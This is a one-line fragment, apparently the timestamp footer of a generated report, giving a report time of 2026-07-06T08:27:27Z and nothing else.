_Report time: 2026-07-06T08:27:27Z_
